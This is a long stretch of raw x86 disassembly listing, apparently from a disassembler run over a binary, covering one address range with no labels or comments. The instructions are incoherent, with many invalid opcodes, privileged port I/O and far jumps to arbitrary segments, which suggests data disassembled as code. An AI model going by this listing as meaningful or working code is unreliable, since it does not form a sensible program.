  407b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b03:	xchg   edx,eax
  407b04:	add    ecx,DWORD PTR [eax-0x571c92c3]
  407b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b0b:	mov    eax,0x9bb90005
  407b10:	dec    ecx
  407b11:	lods   al,BYTE PTR ds:[esi]
  407b12:	cld    
  407b13:	cmp    edx,DWORD PTR [edi]
  407b15:	mov    esi,0xd3c937b8
  407b1a:	sbb    eax,0x764fcbce
  407b1f:	ins    DWORD PTR es:[edi],dx
  407b20:	cdq    
  407b21:	dec    ebp
  407b22:	pop    es
  407b23:	and    esi,DWORD PTR [ecx]
  407b25:	iret   
  407b26:	mov    eax,esi
  407b28:	dec    eax
  407b29:	mov    bl,0x1a
  407b2b:	mov    dh,0x83
  407b2d:	dec    BYTE PTR [ecx+0x7627ad60]
  407b33:	sti    
  407b34:	in     al,dx
  407b35:	pop    ecx
  407b36:	inc    edi
  407b37:	fist   DWORD PTR [eax-0x2a]
  407b3a:	xor    bh,ah
  407b3c:	and    al,0x3e
  407b3e:	(bad)  
  407b3f:	mov    eax,0x259fc1e8
  407b44:	mov    dl,0x76
  407b46:	out    0x6c,eax
  407b48:	mov    edx,0x7fc5da9d
  407b4d:	dec    esi
  407b4e:	std    
  407b4f:	push   ecx
  407b50:	add    al,0x36
  407b52:	mov    ah,0x35
  407b54:	call   0x5f09:0x4da189f6
  407b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b5c:	jbe    0x407b5b
  407b5e:	or     dh,BYTE PTR [ebx+0x50764119]
  407b64:	jge    0x407af8
  407b66:	sbb    al,0xa6
  407b68:	add    DWORD PTR [edi+0x28],ebp
  407b6b:	sub    ecx,esp
  407b6d:	test   BYTE PTR [edx-0x3863ec55],bh
  407b73:	das    
  407b74:	dec    eax
  407b75:	add    eax,0x8c7eee1a
  407b7a:	icebp  
  407b7b:	mov    ds:0x32a4548e,al
  407b80:	pop    ds
  407b81:	sbb    ebx,DWORD PTR gs:[edx+0x4bc16008]
  407b88:	jb     0x407ba6
  407b8a:	mov    al,ds:0xbb7dd5b5
  407b8f:	addr16 repz retf 
  407b92:	sbb    dh,al
  407b94:	mov    eax,0xa659ffb8
  407b99:	and    DWORD PTR [ecx],esi
  407b9b:	pop    es
  407b9c:	xlat   BYTE PTR ds:[ebx]
  407b9d:	or     ah,BYTE PTR [edi-0x7557f6a4]
  407ba3:	test   dh,dh
  407ba5:	scas   al,BYTE PTR es:[edi]
  407ba6:	inc    esp
  407ba7:	cdq    
  407ba8:	(bad)  
  407ba9:	scas   al,BYTE PTR es:[edi]
  407baa:	inc    eax
  407bab:	pop    ebx
  407bac:	leave  
  407bad:	call   0xcb0ab3b4
  407bb2:	jp     0x407b88
  407bb4:	aam    0x27
  407bb6:	jns    0x407ba1
  407bb8:	mov    gs,edx
  407bba:	into   
  407bbb:	and    al,0xb3
  407bbd:	in     eax,dx
  407bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bbf:	push   es
  407bc0:	icebp  
  407bc1:	push   es
  407bc2:	mov    ecx,0x7eeb09be
  407bc7:	dec    ecx
  407bc8:	cmp    ebx,DWORD PTR [esi+0x3b]
  407bcb:	inc    edx
  407bcc:	out    0xd2,eax
  407bce:	mov    edi,0x263c26ad
  407bd3:	sbb    ebx,DWORD PTR [eax-0x76]
  407bd6:	push   eax
  407bd7:	loope  0x407c0e
  407bd9:	sbb    cl,bh
  407bdb:	jo     0x407bf6
  407bdd:	mov    ch,0xfd
  407bdf:	push   0xffffffb1
  407be1:	int    0x1d
  407be3:	sbb    edi,DWORD PTR [ecx]
  407be5:	clc    
  407be6:	stos   BYTE PTR es:[edi],al
  407be7:	xchg   edx,eax
  407be8:	add    DWORD PTR [esi+0x7b],edi
  407beb:	cli    
  407bec:	push   ebp
  407bed:	add    BYTE PTR [eax+esi*4],dh
  407bf0:	mov    ch,0xf
  407bf2:	mov    BYTE PTR [edi+0x5b],bl
  407bf5:	mov    ebp,0x49ba709a
  407bfa:	lods   eax,DWORD PTR ds:[esi]
  407bfb:	inc    eax
  407bfc:	xor    ah,ch
  407bfe:	xchg   ecx,eax
  407bff:	add    BYTE PTR [edx+ebx*2-0x55987db6],ah
  407c06:	fcom   DWORD PTR ds:0x4465afbf
  407c0c:	jnp    0x407c58
  407c0e:	jnp    0x407c8b
  407c10:	sahf   
  407c11:	loopne 0x407c2e
  407c13:	cmp    BYTE PTR [ebp-0x472ef787],0xb1
  407c1a:	data16 mov cl,0x3a
  407c1d:	xchg   ebx,eax
  407c1e:	xchg   ebp,eax
  407c1f:	outs   dx,DWORD PTR ds:[esi]
  407c20:	jmp    0x73d0:0x9ec19b5c
  407c27:	push   ecx
  407c28:	mov    esp,0xdb78ee0c
  407c2d:	jg     0x407c38
  407c2f:	sub    esi,DWORD PTR [ebx+0x4b507572]
  407c35:	pop    esi
  407c36:	icebp  
  407c37:	arpl   WORD PTR [esi],bp
  407c39:	fidiv  DWORD PTR [edi+0x4f]
  407c3c:	sbb    DWORD PTR [eax-0x74],ebx
  407c3f:	jno    0x407c54
  407c41:	shl    DWORD PTR [eax],cl
  407c43:	mov    ds:0x55d157e7,al
  407c48:	mov    gs,WORD PTR [esi-0x331c6fb9]
  407c4e:	inc    esp
  407c4f:	jle    0x407c6c
  407c51:	les    esp,FWORD PTR [edx+esi*1]
  407c54:	sbb    edi,DWORD PTR [ecx+0x402d9b0b]
  407c5a:	ror    BYTE PTR ds:0xe4e0c111,1
  407c60:	fwait
  407c61:	push   es
  407c62:	xchg   edi,eax
  407c63:	or     ch,0xc0
  407c66:	jmp    0x69fe4d42
  407c6b:	test   al,0xbc
  407c6d:	xchg   edi,eax
  407c6e:	cmovg  edx,DWORD PTR [eax]
  407c71:	mov    eax,0x8997aa48
  407c76:	jae    0x407c69
  407c78:	cld    
  407c79:	sti    
  407c7a:	and    DWORD PTR ds:0x6132a536,esp
  407c80:	ins    BYTE PTR es:[edi],dx
  407c81:	int    0x3b
  407c83:	icebp  
  407c84:	rcl    DWORD PTR [edi],0xe5
  407c87:	xchg   esi,eax
  407c88:	js     0x407cc7
  407c8a:	pop    ebp
  407c8b:	xor    DWORD PTR ds:0x571d7e5f,0x97861f42
  407c95:	cld    
  407c96:	mov    bl,0xee
  407c98:	sbb    DWORD PTR [edx-0x57],ebp
  407c9b:	(bad)  
  407c9c:	int    0xde
  407c9e:	ins    DWORD PTR es:[edi],dx
  407c9f:	fmul   st(3),st
  407ca1:	pop    ss
  407ca2:	push   0x4ed036ab
  407ca7:	push   ss
  407ca8:	mov    bh,0x54
  407caa:	add    bh,BYTE PTR [esi-0x46ae1739]
  407cb0:	mov    eax,ds:0x9984e011
  407cb5:	dec    eax
  407cb6:	fs jbe 0x407ce7
  407cb9:	out    0x51,eax
  407cbb:	int3   
  407cbc:	inc    ebx
  407cbd:	push   esi
  407cbe:	test   DWORD PTR [esi-0x74f4375c],0xbcb563c
  407cc8:	mov    ecx,0x3f991e0a
  407ccd:	div    BYTE PTR [ebp+0x32]
  407cd0:	xor    ecx,edi
  407cd2:	popf   
  407cd3:	mov    dh,0xc4
  407cd5:	fadd   DWORD PTR [esi+0x224e2a2b]
  407cdb:	or     al,0x30
  407cdd:	dec    ecx
  407cde:	out    dx,al
  407cdf:	(bad)  
  407ce0:	jmp    0xbb683dd6
  407ce5:	sbb    BYTE PTR [edi],dl
  407ce7:	sar    BYTE PTR [ecx+0x47a04b6e],cl
  407ced:	sbb    eax,0xe75934b0
  407cf2:	mov    WORD PTR [edi-0x58f91166],gs
  407cf8:	popa   
  407cf9:	in     al,dx
  407cfa:	lock fidivr DWORD PTR [ebx+0xb]
  407cfe:	push   es
  407cff:	jmp    0x407cb8
  407d01:	daa    
  407d02:	outs   dx,BYTE PTR ds:[esi]
  407d03:	mov    ecx,0xd0214141
  407d08:	sbb    bh,dl
  407d0a:	mov    WORD PTR [esi],ds
  407d0c:	imul   edx,DWORD PTR [eax-0x6c],0xb287fc40
  407d13:	cmp    eax,0x60bf24f4
  407d18:	dec    ecx
  407d19:	pusha  
  407d1a:	pop    esp
  407d1b:	daa    
  407d1c:	inc    edx
  407d1d:	sbb    al,0x6c
  407d1f:	cwde   
  407d20:	cdq    
  407d21:	jmp    0xceb80fa2
  407d26:	jmp    0xc2ab:0x280c0383
  407d2d:	jno    0x407d2c
  407d2f:	mov    dh,0xb1
  407d31:	mov    BYTE PTR [edi],dl
  407d33:	pop    esi
  407d34:	push   ss
  407d35:	or     dh,al
  407d37:	fist   WORD PTR [edi+eax*8+0x20]
  407d3b:	ins    BYTE PTR es:[edi],dx
  407d3c:	int    0x4e
  407d3e:	rcl    DWORD PTR [ebx+0x5557f296],0xe0
  407d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d46:	test   eax,0x66babca9
  407d4b:	retf   
  407d4c:	xor    BYTE PTR [edx],bl
  407d4e:	fadd   DWORD PTR [eax+0x3584d369]
  407d54:	ret    
  407d55:	aad    0xb7
  407d57:	or     DWORD PTR [edi-0x28],esp
  407d5a:	adc    ebx,DWORD PTR [ecx+0xa83ad0c]
  407d60:	pop    DWORD PTR [edi]
  407d62:	shl    edi,0x7a
  407d65:	stc    
  407d66:	(bad)  
  407d67:	mov    bh,0xc3
  407d69:	adc    bl,dh
  407d6b:	xchg   edi,eax
  407d6c:	push   ds
  407d6d:	or     eax,esp
  407d6f:	jge    0x407d4f
  407d71:	add    ecx,DWORD PTR [ecx-0x33]
  407d74:	jge    0x407de8
  407d76:	push   ebp
  407d77:	cmp    eax,DWORD PTR [bp+di]
  407d7a:	int3   
  407d7b:	(bad)  
  407d7c:	and    DWORD PTR [eax-0x6f8e4b63],esp
  407d82:	(bad)  
  407d83:	mov    bl,0xe8
  407d85:	push   ebp
  407d86:	inc    ah
  407d88:	pop    edx
  407d89:	and    ebx,ebp
  407d8b:	std    
  407d8c:	pop    ecx
  407d8d:	adc    ah,ch
  407d8f:	repz push esp
  407d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d92:	mov    ecx,0x2feb822f
  407d97:	fistp  QWORD PTR [edx+0x62]
  407d9a:	rcr    BYTE PTR [esi-0x60],cl
  407d9d:	call   0xd331:0x25af966
  407da4:	cmp    al,0x53
  407da6:	aam    0x78
  407da8:	lahf   
  407da9:	mov    ds:0x649f390,eax
  407dae:	out    dx,eax
  407daf:	jns    0x407e07
  407db1:	add    al,BYTE PTR [ebp-0x6dfedac7]
  407db7:	adc    cl,al
  407db9:	and    al,ah
  407dbb:	mov    WORD PTR [ebp+0x13],gs
  407dbe:	sbb    DWORD PTR [eax+0x3],eax
  407dc1:	or     al,BYTE PTR [ebx+0x775d1bce]
  407dc7:	test   al,0x1d
  407dc9:	push   cs
  407dca:	dec    esp
  407dcb:	clc    
  407dcc:	inc    edx
  407dcd:	stc    
  407dce:	sbb    DWORD PTR [ecx],0x6553045b
  407dd4:	(bad)  
  407dd5:	dec    esi
  407dd6:	sbb    eax,0x3474b9c0
  407ddb:	imul   edi,DWORD PTR [edi],0xffffffe2
  407dde:	popa   
  407ddf:	push   cs
  407de0:	cmp    eax,edi
  407de2:	loope  0x407e28
  407de4:	lock arpl WORD PTR [eax],bp
  407de7:	inc    esi
  407de8:	cmp    eax,0x42548c3c
  407ded:	add    al,0xaa
  407def:	inc    eax
  407df0:	adc    al,0xa8
  407df2:	js     0x407e3e
  407df4:	stos   BYTE PTR es:[edi],al
  407df5:	push   ebx
  407df6:	and    ch,cl
  407df8:	adc    eax,0xd657c8d4
  407dfd:	mov    cl,0x34
  407dff:	inc    eax
  407e00:	test   al,0x72
  407e02:	push   ebx
  407e03:	jp     0x407dda
  407e05:	cmp    edx,DWORD PTR [edx+0x4a]
  407e08:	aaa    
  407e09:	xchg   ecx,eax
  407e0a:	inc    esp
  407e0b:	pop    eax
  407e0c:	add    dl,dh
  407e0e:	cmp    DWORD PTR [esi],ebx
  407e10:	pusha  
  407e11:	pop    ebp
  407e12:	xchg   ebx,eax
  407e13:	mov    esp,0xba09f1c6
  407e18:	lods   eax,DWORD PTR ds:[esi]
  407e19:	icebp  
  407e1a:	mov    bh,0x13
  407e1c:	out    dx,al
  407e1d:	xchg   esp,eax
  407e1e:	and    DWORD PTR [eax+ebx*4],edx
  407e21:	xor    al,0xf2
  407e23:	or     dl,BYTE PTR [ebp-0x47]
  407e26:	int3   
  407e27:	jae    0x407ea3
  407e29:	cmp    al,BYTE PTR es:[ebx]
  407e2c:	pop    esp
  407e2d:	add    bh,BYTE PTR [eax-0x3d2e4c6e]
  407e33:	mov    ebx,0x51bf591
  407e38:	push   ss
  407e39:	jge    0x407e32
  407e3b:	dec    ebx
  407e3c:	and    ebp,DWORD PTR [esi+0x1d]
  407e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e40:	mov    bh,BYTE PTR [edi+0x7]
  407e43:	mov    al,0xb3
  407e45:	sub    al,0xec
  407e47:	clc    
  407e48:	push   edi
  407e49:	test   DWORD PTR [eax-0x1e5d50fb],esp
  407e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e50:	les    ebp,FWORD PTR [edi+0x5b64c33]
  407e56:	add    eax,DWORD PTR [ebx+0xc]
  407e59:	or     eax,0xa1083e8f
  407e5e:	xchg   edx,eax
  407e5f:	jmp    0x6f2f:0x8b7c0de8
  407e66:	sti    
  407e67:	push   esp
  407e68:	dec    edx
  407e69:	and    ecx,eax
  407e6b:	add    ah,BYTE PTR [eax]
  407e6d:	mov    ds:0xe2d4e475,eax
  407e72:	(bad)  
  407e74:	pushf  
  407e75:	es mov edi,0x8e76c960
  407e7b:	sub    DWORD PTR [edx+0x66ea319b],0x2c43fff3
  407e85:	sar    ebp,cl
  407e87:	fdiv   st,st(4)
  407e89:	add    al,0xa7
  407e8b:	or     esp,DWORD PTR [edi]
  407e8d:	mov    edx,DWORD PTR [ebp+0x1abb520d]
  407e93:	fstp   TBYTE PTR [eax]
  407e95:	mov    dh,0xe5
  407e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e98:	(bad)  
  407e99:	mov    ebx,0x35a92ec1
  407e9e:	sar    DWORD PTR [ecx-0xc81d4ef],0xf5
  407ea5:	jp     0x407ee8
  407ea7:	adc    ecx,DWORD PTR [ecx+0x29]
  407eaa:	jmp    0x407e32
  407eac:	sub    esi,DWORD PTR [ecx-0x6f7a892b]
  407eb2:	loope  0x407eb2
  407eb4:	adc    eax,0x28e0e7c0
  407eb9:	push   ecx
  407eba:	dec    esp
  407ebb:	(bad)  
  407ebc:	push   cs
  407ebd:	dec    ecx
  407ebe:	inc    eax
  407ebf:	and    BYTE PTR [edi],ah
  407ec1:	jmp    edi
  407ec3:	push   es
  407ec4:	jle    0x407e69
  407ec6:	xor    al,0xda
  407ec8:	fistp  QWORD PTR [eax-0x7c]
  407ecb:	out    0x90,eax
  407ecd:	ret    0xf2fd
  407ed0:	push   0xee02daa0
  407ed5:	(bad)  [eax+0x25]
  407ed8:	addr16 mov al,0x3d
  407edb:	dec    edi
  407edc:	sbb    dh,dl
  407ede:	mov    ebx,0x1bdc6858
  407ee3:	adc    eax,0x48d4be76
  407ee8:	dec    ebx
  407ee9:	js     0x407eaa
  407eeb:	popf   
  407eec:	xchg   edx,eax
  407eed:	ja     0x407f3a
  407eef:	mov    bl,0x84
  407ef1:	sti    
  407ef2:	add    dl,bl
  407ef4:	sbb    BYTE PTR [esi],cl
  407ef6:	repz dec eax
  407ef8:	sub    eax,0x1188e13b
  407efd:	inc    esi
  407efe:	jbe    0x407f71
  407f00:	cmovp  edx,DWORD PTR [ebx-0x5c]
  407f04:	inc    edx
  407f05:	fmul   DWORD PTR [ebp-0x4]
  407f08:	mov    eax,ds:0x566eff94
  407f0d:	adc    eax,0xb9b98a78
  407f12:	scas   eax,DWORD PTR es:[edi]
  407f13:	std    
  407f14:	sub    eax,0x5b0af66c
  407f19:	xchg   edx,eax
  407f1a:	sti    
  407f1b:	mov    dh,0x3c
  407f1d:	retf   
  407f1e:	call   0x5c6d:0x926e3f1d
  407f25:	or     dl,al
  407f27:	pusha  
  407f28:	fwait
  407f29:	call   FWORD PTR [edx]
  407f2b:	(bad)  
  407f2c:	aad    0xf3
  407f2e:	mov    ds:0xebd5c5e4,eax
  407f33:	stos   DWORD PTR es:[edi],eax
  407f34:	cmp    al,BYTE PTR [ebp+0x57fe85e0]
  407f3a:	mov    bl,0xd1
  407f3c:	setb   BYTE PTR [ebx-0x15]
  407f40:	out    0x59,eax
  407f42:	sbb    al,0xa1
  407f44:	dec    edi
  407f45:	jbe    0x407f38
  407f47:	lea    edi,[edx+0x1]
  407f4a:	or     dl,ah
  407f4c:	xor    al,BYTE PTR [ecx+0x35]
  407f4f:	ror    esp,cl
  407f51:	das    
  407f52:	lock js 0x407f6a
  407f55:	jo     0x407f85
  407f57:	in     al,dx
  407f58:	repnz ffree st(7)
  407f5b:	fcomp  st(4)
  407f5d:	dec    eax
  407f5e:	pop    eax
  407f5f:	mov    al,0xb8
  407f61:	mov    cl,BYTE PTR [eax-0x697068e6]
  407f67:	xchg   edi,eax
  407f68:	sub    eax,0xf5310f19
  407f6d:	ins    DWORD PTR es:[edi],dx
  407f6e:	stos   DWORD PTR es:[edi],eax
  407f6f:	adc    al,0x2c
  407f71:	fbstp  TBYTE PTR [eax]
  407f73:	xlat   BYTE PTR ds:[ebx]
  407f74:	sahf   
  407f75:	jp     0x407fa8
  407f77:	aam    0x24
  407f79:	in     eax,dx
  407f7a:	xchg   ebx,eax
  407f7b:	mov    esp,0x3a64c446
  407f80:	jne    0x407f11
  407f82:	and    eax,0x6c21301f
  407f87:	xor    al,0x20
  407f89:	(bad)  
  407f8a:	mov    esi,0xf35eff28
  407f8f:	in     eax,dx
  407f90:	jecxz  0x407fa8
  407f92:	and    DWORD PTR [ecx+eax*2],ebp
  407f95:	xchg   ebp,eax
  407f96:	jle    0x407f62
  407f98:	lods   eax,DWORD PTR ds:[esi]
  407f99:	shl    DWORD PTR [edi+0x4a804e84],0xba
  407fa0:	cmp    eax,0x394d8d13
  407fa5:	repnz or esp,DWORD PTR [ebp+0x3f5f7d55]
  407fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fad:	pop    esp
  407fae:	push   ebx
  407faf:	ret    0x6541
  407fb2:	xor    al,0xa2
  407fb4:	mov    eax,ds:0xbde6e961
  407fb9:	sbb    BYTE PTR [edi+0x21],bl
  407fbc:	xchg   esp,eax
  407fbd:	sbb    BYTE PTR [edx+esi*1+0x71],dh
  407fc1:	shl    DWORD PTR [esi],0xb7
  407fc4:	daa    
  407fc5:	fld    TBYTE PTR [ecx-0xf]
  407fc8:	xchg   edx,eax
  407fc9:	or     al,0xbe
  407fcb:	xrstor [edi+0x2e5b74ac]
  407fd2:	push   edx
  407fd3:	test   BYTE PTR [ebp+0x1d177b05],cl
  407fd9:	ss add eax,0x25885daf
  407fdf:	mov    al,0x6
  407fe1:	mov    cl,BYTE PTR [edi+eax*8]
  407fe4:	pop    ss
  407fe5:	dec    eax
  407fe6:	fcmove st,st(3)
  407fe8:	and    eax,0x61b55587
  407fed:	xor    al,0xe0
  407fef:	dec    ecx
  407ff0:	pop    edx
  407ff1:	lds    edx,FWORD PTR [edx]
  407ff3:	bnd jnp 0x40804e
  407ff6:	and    BYTE PTR [edx+0x246592bc],al
  407ffc:	sub    ecx,ebx
  407ffe:	sbb    DWORD PTR [esi-0x19],0xc923b43c
  408005:	cmc    
  408006:	add    edx,DWORD PTR [ebx]
  408008:	push   es
  408009:	dec    ecx
  40800a:	in     al,0x94
  40800c:	je     0x40805b
  40800e:	or     ah,al
  408010:	ins    DWORD PTR es:[edi],dx
  408011:	adc    DWORD PTR [edx-0x25],0xaf2d27e2
  408018:	mov    esp,0x9542c744
  40801d:	mov    ebp,0xb2fc144c
  408022:	or     dl,BYTE PTR [ebx+0x68]
  408025:	sbb    eax,ebp
  408027:	fsub   QWORD PTR [esi+0x2c]
  40802a:	shl    DWORD PTR [ebp+edi*4-0x4b],cl
  40802e:	inc    ebp
  40802f:	jp     0x408012
  408031:	js     0x407ff4
  408033:	mov    eax,0xc9679678
  408038:	ss nop
  40803a:	(bad)  
  40803b:	(bad)  
  40803c:	std    
  40803d:	adc    al,0xb
  40803f:	lods   eax,DWORD PTR ds:[esi]
  408040:	adc    BYTE PTR cs:[ebp+0x22],ch
  408044:	ret    
  408045:	pop    ebp
  408046:	aaa    
  408047:	push   0x4d
  408049:	cmp    cl,BYTE PTR [ebp-0x4e049184]
  40804f:	outs   dx,DWORD PTR ds:[esi]
  408050:	or     DWORD PTR [esi+0x6a],edx
  408053:	cs (bad) 
  408055:	outs   dx,DWORD PTR ds:[esi]
  408056:	fist   WORD PTR [esi+0x42ca08b9]
  40805c:	stos   DWORD PTR es:[edi],eax
  40805d:	jae    0x4080c2
  40805f:	mov    dh,0xa5
  408061:	mov    ebp,DWORD PTR [ecx+esi*1]
  408064:	fstp   DWORD PTR [ebp-0x15]
  408067:	push   edi
  408068:	push   ecx
  408069:	xor    BYTE PTR [ecx+0x24],dl
  40806c:	lods   al,BYTE PTR ds:[esi]
  40806d:	or     dl,BYTE PTR [ecx+ebp*8]
  408070:	jbe    0x4080ba
  408072:	les    edi,FWORD PTR [eax-0x4c]
  408075:	mov    ecx,0x8f4e09ed
  40807a:	into   
  40807b:	repnz pop ebx
  40807d:	int    0xab
  40807f:	cdq    
  408080:	xchg   edx,eax
  408081:	daa    
  408082:	push   ss
  408083:	(bad)  
  408084:	loope  0x40800c
  408086:	sbb    al,0x77
  408088:	push   0x6
  40808a:	adc    BYTE PTR [ecx+ebp*2],ah
  40808d:	push   edi
  40808e:	lock es jae 0x408043
  408092:	in     eax,0x49
  408094:	ret    
  408095:	adc    eax,0xfc134cc6
  40809a:	jl     0x40804e
  40809c:	adc    bh,bh
  40809e:	cmp    BYTE PTR [ebx],ch
  4080a0:	cmp    al,0xa6
  4080a2:	ret    
  4080a3:	int    0xe5
  4080a5:	jl     0x4080a0
  4080a7:	fimul  WORD PTR [edx-0x16cd1c45]
  4080ad:	sbb    BYTE PTR [edi],ch
  4080af:	loope  0x40810e
  4080b1:	dec    ebx
  4080b2:	cdq    
  4080b3:	push   ebp
  4080b4:	shl    BYTE PTR [eax],cl
  4080b6:	xor    ebp,esp
  4080b8:	push   ebx
  4080b9:	dec    esp
  4080ba:	sbb    edi,DWORD PTR [ebx]
  4080bc:	xchg   edi,eax
  4080bd:	or     ch,BYTE PTR [ecx]
  4080bf:	push   esp
  4080c0:	adc    eax,0xb5dbaf6b
  4080c5:	mov    ah,0xea
  4080c7:	das    
  4080c8:	add    al,0x1b
  4080ca:	push   0x28
  4080cc:	or     ah,BYTE PTR [esi-0x19]
  4080cf:	iret   
  4080d0:	jne    0x408129
  4080d2:	sub    al,0xb9
  4080d4:	sub    dh,BYTE PTR [edx-0x774488b2]
  4080da:	add    eax,0x2c3d40f6
  4080df:	cwde   
  4080e0:	std    
  4080e1:	retf   0x676f
  4080e4:	aam    0x93
  4080e6:	pop    ebp
  4080e7:	push   0xffffff88
  4080e9:	dec    ebx
  4080ea:	xchg   edx,eax
  4080eb:	into   
  4080ec:	data16 mov dh,0xea
  4080ef:	xchg   edx,eax
  4080f0:	push   ebp
  4080f1:	cmc    
  4080f2:	inc    esp
  4080f3:	ds cwde 
  4080f5:	mov    DWORD PTR [edx],esp
  4080f7:	das    
  4080f8:	out    0xbc,al
  4080fa:	in     eax,0xb0
  4080fc:	daa    
  4080fd:	daa    
  4080fe:	iret   
  4080ff:	jne    0x408170
  408101:	jecxz  0x408084
  408103:	in     eax,dx
  408104:	dec    edx
  408105:	add    esi,ecx
  408107:	push   ecx
  408108:	popa   
  408109:	call   0x59badb27
  40810e:	mov    ch,0xeb
  408110:	stos   DWORD PTR es:[edi],eax
  408111:	nop
  408112:	jmp    0xbde84314
  408117:	(bad)  
  408118:	stos   BYTE PTR es:[edi],al
  408119:	cld    
  40811a:	sub    al,0x74
  40811c:	mov    ds:0xd4bcc0ef,eax
  408121:	push   eax
  408122:	sbb    ebp,DWORD PTR [edi+ebp*4+0x5c4433ed]
  408129:	sub    eax,0x530528f5
  40812e:	loope  0x40811c
  408130:	std    
  408131:	sbb    bl,BYTE PTR [edx-0x56bfc6fb]
  408137:	pop    ecx
  408138:	sbb    DWORD PTR [edx+esi*4-0x54],ebp
  40813c:	loope  0x408111
  40813e:	cmp    eax,0x1f9f0317
  408143:	sub    DWORD PTR [edx],0xbc9ec453
  408149:	dec    ebp
  40814a:	push   ss
  40814b:	xchg   ebp,eax
  40814c:	fisub  WORD PTR [edx-0x127c26ff]
  408152:	sbb    edi,edx
  408154:	or     DWORD PTR [ecx],eax
  408156:	cwde   
  408157:	push   ss
  408158:	xchg   edx,eax
  408159:	sub    ebp,eax
  40815b:	xor    al,0xfe
  40815d:	jg     0x408180
  40815f:	pusha  
  408160:	add    dl,BYTE PTR [ecx+0x21]
  408163:	push   edx
  408164:	mov    ds:0xdf0cff8c,al
  408169:	test   eax,0x86ce7db8
  40816e:	and    eax,0x45283e63
  408173:	stos   BYTE PTR es:[edi],al
  408174:	cmp    eax,DWORD PTR [edx+0x4]
  408177:	inc    ebx
  408178:	cmp    esp,esi
  40817a:	xor    edx,ebx
  40817c:	hlt    
  40817d:	adc    ah,BYTE PTR [ebp+0x681f1894]
  408183:	mov    ecx,edi
  408185:	leave  
  408186:	sbb    ebx,edi
  408188:	cmp    BYTE PTR [esi+eax*4],bh
  40818b:	adc    DWORD PTR [ebp-0x2a],eax
  40818e:	adc    BYTE PTR [ebp+0x7f],ah
  408191:	mov    eax,ds:0xd06f6a44
  408196:	pop    ds
  408197:	aad    0x85
  408199:	push   ds
  40819a:	add    BYTE PTR [eax+edx*2-0x63c552dc],0x18
  4081a2:	mov    bh,0xd3
  4081a4:	out    0x6b,eax
  4081a6:	jae    0x4081f9
  4081a8:	enter  0x2868,0x7d
  4081ac:	mov    BYTE PTR [esi+0x7e],al
  4081af:	push   edi
  4081b0:	call   0x9b4a:0x9adf8d33
  4081b7:	pop    ecx
  4081b8:	inc    esp
  4081b9:	push   0x211e0e18
  4081be:	out    0xe3,eax
  4081c0:	cwde   
  4081c1:	xchg   edi,eax
  4081c2:	int    0x3b
  4081c4:	loopne 0x40814f
  4081c6:	and    dh,BYTE PTR [esi-0xe9c83df]
  4081cc:	lds    ebp,FWORD PTR [ecx]
  4081ce:	fcmovbe st,st(6)
  4081d0:	sub    dl,BYTE PTR [ebx]
  4081d2:	jmp    0x52ca:0xb7999c6c
  4081d9:	inc    ebx
  4081da:	mov    eax,ds:0x21d017c1
  4081df:	push   eax
  4081e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081e1:	jnp    0x4081bd
  4081e3:	jne    0x408218
  4081e5:	and    cl,BYTE PTR [ebp-0x18]
  4081e8:	xchg   ecx,eax
  4081e9:	mov    eax,ds:0xcece0530
  4081ee:	inc    esi
  4081ef:	push   ds
  4081f0:	mov    BYTE PTR [esi+0x2c],ch
  4081f3:	lods   ax,WORD PTR ds:[esi]
  4081f5:	pop    eax
  4081f6:	mov    BYTE PTR [ecx+0x22],cl
  4081f9:	push   ebp
  4081fa:	aas    
  4081fb:	mov    edx,0x8f10a1ec
  408200:	push   esp
  408201:	pushf  
  408202:	daa    
  408203:	daa    
  408204:	nop
  408205:	push   ecx
  408206:	popa   
  408207:	jo     0x40820c
  408209:	mov    gs,WORD PTR [ebp+0x6b]
  40820c:	icebp  
  40820d:	es inc ecx
  40820f:	retf   
  408210:	aad    0x75
  408212:	imul   ecx,DWORD PTR [esi],0x5cb5daed
  408218:	cmp    al,0xd
  40821a:	pop    esp
  40821b:	jl     0x932446
  408221:	clc    
  408222:	je     0x4081f6
  408224:	dec    ebx
  408225:	xor    al,0xc5
  408227:	ret    0x24e6
  40822a:	or     ebp,DWORD PTR gs:[ecx-0x5c7be50d]
  408231:	rcl    dl,0x81
  408234:	repz aad 0xe8
  408237:	mov    ds:0xcb047bd6,al
  40823c:	fsubr  DWORD PTR [eax]
  40823e:	retf   
  40823f:	lods   eax,DWORD PTR ds:[esi]
  408240:	jp     0x408272
  408242:	mov    al,ds:0x16d63cda
  408247:	mov    edi,0xb4796d0
  40824c:	xor    BYTE PTR [esi],0x38
  40824f:	xchg   esi,eax
  408250:	or     ebp,edx
  408252:	push   ebp
  408253:	in     al,0x85
  408255:	or     eax,0x21d7050
  40825a:	repz mov ecx,0xd0535419
  408260:	ds (bad) 
  408262:	jge    0x408218
  408264:	sbb    eax,0xc1568096
  408269:	je     0x408275
  40826b:	add    al,0x2c
  40826d:	sbb    BYTE PTR [eax],ch
  40826f:	popf   
  408270:	adc    al,0xa3
  408272:	and    edx,DWORD PTR [ecx]
  408274:	dec    ecx
  408275:	jne    0x40823f
  408277:	push   ecx
  408278:	lock repz sub dl,al
  40827c:	inc    esp
  40827d:	cmp    BYTE PTR ds:[eax+esi*2-0x50],0x64
  408283:	ret    
  408284:	add    ch,BYTE PTR [eax+0x4f9dc7a6]
  40828a:	pop    ebx
  40828b:	xor    bh,cl
  40828d:	mov    eax,ebx
  40828f:	aam    0x36
  408291:	or     eax,0xa2929faa
  408296:	push   ss
  408297:	jmp    0x4082a7
  408299:	shl    DWORD PTR [edx+0x4c6ba590],1
  40829f:	mov    ebp,0xaceacd1b
  4082a4:	pop    esi
  4082a5:	mov    bl,0x63
  4082a7:	dec    edi
  4082a8:	sahf   
  4082a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
